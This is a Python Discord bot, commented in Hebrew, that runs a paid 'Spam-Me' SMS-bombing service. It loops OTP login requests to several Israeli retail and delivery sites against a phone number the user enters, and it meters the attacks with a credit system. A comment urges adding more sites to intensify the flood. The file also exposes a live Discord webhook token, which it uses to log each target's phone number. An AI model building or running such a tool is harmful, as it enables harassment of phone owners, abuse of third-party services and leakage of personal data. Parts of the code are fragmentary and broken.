# --- הגדרות מערכת ---
LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1500272424271216722/0-37rlL5Dhf534ZR29rGVbi_jADkvNbaKVg7TJBWvEuGf99pBpxGqrVPB_7DH8JWLtQI"
DB_FILE = "credits_db.json"
ADMIN_ROLE_NAME = "Owner"

# --- ניהול מסד נתונים ---
def load_data():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            try:
                data = json.load(f)
                return {int(k): v for k, v in data.get("credits", {}).items()}, set(data.get("lifetime", []))
            except: pass
    return {}, set()

def save_data(credits, lifetime):
    with open(DB_FILE, "w") as f:
        json.dump({"credits": credits, "lifetime": list(lifetime)}, f)

user_credits, lifetime_users = load_data()

# --- שרת Render לשמירה על הבוט דלוק ---
def run_on_render():
    PORT = int(os.environ.get("PORT", 8080))
    with socketserver.TCPServer(("", PORT), http.server.SimpleHTTPRequestHandler) as httpd:
        httpd.serve_forever()
threading.Thread(target=run_on_render, daemon=True).start()

bot = MyBot()
sem = asyncio.Semaphore(15)

# --- פונקציות עזר (לוגים וספאם) ---
async def send_log(user, phone, amount):
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(LOG_WEBHOOK_URL, session=session)
        embed = discord.Embed(title="🔔 הפעלה חדשה", color=0x3498db)
        embed.add_field(name="👤 משתמש", value=f"{user.name} ({user.id})", inline=False)
        embed.add_field(name="📱 יעד", value=phone, inline=True)
        embed.add_field(name="💰 קרדיטים", value=str(amount), inline=True)
        await webhook.send(embed=embed)

async def call_api(client, url, method, payload):
    async with sem:
        try:
            if method == "POST":
                resp = await client.post(url, json=payload, timeout=4)
            else:
                resp = await client.get(url, params=payload, timeout=4)
            return resp.is_success
        except: return False

async def send_spam(user, phone, seconds):
    # רשימת אתרים לדוגמה - מומלץ להוסיף עוד כדי לחזק את הספאם
    apis = [
        {"url": "https://www.shufersal.co.il/online/he/login/send-otp", "method": "POST", "data": {"phone": phone}},
        {"url": "https://www.super-pharm.co.il/api/otp/send", "method": "POST", "data": {"phoneNumber": phone}},
        {"url": "https://api.getpackage.com/v1/auth/login", "method": "POST", "data": {"phone": phone}},
        {"url": "https://pizzahut.co.il/api/auth/otp", "method": "POST", "data": {"phone": phone}},
        {"url": "https://www.wolt.com/api/v1/user/login", "method": "POST", "data": {"phone": phone}}
    ]
    
    success_count = 0
    fail_count = 0
    end_time = asyncio.get_event_loop().time() + seconds
    
    async with httpx.AsyncClient() as client:
        while asyncio.get_event_loop().time() < end_time:
            tasks = [call_api(client, api["url"], api["method"], api["data"]) for api in apis]
            results = await asyncio.gather(*tasks)
            success_count += results.count(True)
            fail_count += results.count(False)
            await asyncio.sleep(3)

    # שליחת סיכום לפרטי (DM)
    try:
        embed = discord.Embed(title="📊 סיכום הפצצה - Spam-Me", color=0x2ecc71)
        embed.add_field(name="📱 יעד", value=phone, inline=False)
        embed.add_field(name="✅ הצלחות", value=str(success_count), inline=True)
        embed.add_field(name="❌ כשלונות", value=str(fail_count), inline=True)
        await user.send(embed=embed)
    except: pass

# --- ממשק משתמש (UI) ---
class SpamModal(discord.ui.Modal, title='Spam-Me Control Panel'):
    phone = discord.ui.TextInput(label='Phone Number', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    credits = discord.ui.TextInput(label='Credits (1 = 35s)', placeholder='1')

    async def on_submit(self, interaction: discord.Interaction):
        try:
            amt = int(self.credits.value)
            is_owner = any(r.name == ADMIN_ROLE_NAME for r in interaction.user.roles)
            
            if not (interaction.user.id in lifetime_users or is_owner) and user_credits.get(interaction.user.id, 0) < amt:
                return await interaction.response.send_message("❌ אין לך מספיק קרדיטים!", ephemeral=True)

            if not (interaction.user.id in lifetime_users or is_owner):
                user_credits[interaction.user.id] -= amt
                save_data(user_credits, lifetime_users)

            asyncio.create_task(send_log(interaction.user, self.phone.value, amt))
            await interaction.response.send_message(f"🚀 הפצצה על {self.phone.value} החלה! סיכום יישלח אליך לפרטי.", ephemeral=True)
            asyncio.create_task(send_spam(interaction.user, self.phone.value, amt * 35))
        except:
            await interaction.response.send_message("❌ שגיאה בנתונים שהוזנו.", ephemeral=True)

class ControlView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="🚀 Spam Phone", style=discord.ButtonStyle.primary, custom_id="sp")
    async def sp(self, i, b): await i.response.send_modal(SpamModal())
    @discord.ui.button(label="💰 My Credits", style=discord.ButtonStyle.secondary)
    async def cr(self, i, b):
        bal = "Unlimited ♾️" if i.user.id in lifetime_users else user_credits.get(i.user.id, 0)
        await i.response.send_message(f"💰 יתרה נוכחית: {bal}", ephemeral=True)

    await i.response.send_message(embed=emb, view=ControlView())

@bot.tree.command(name="add_credits")
async def add(i: discord.Interaction, m: discord.Member, a: int):
    if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles): return
    user_credits[m.id] = user_credits.get(m.id, 0) + a
    save_data(user_credits, lifetime_users)
    await i.response.send_message(f"✅ נוספו {a} קרדיטים ל-{m.mention}", ephemeral=True)

@bot.tree.command(name="remove_credits")
async def remove(i: discord.Interaction, m: discord.Member, a: int):
    if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles): return
    user_credits[m.id] = max(0, user_credits.get(m.id, 0) - a)
    save_data(user_credits, lifetime_users)
    await i.response.send_message(f"📉 הוסרו {a} קרדיטים מ-{m.mention}", ephemeral=True)
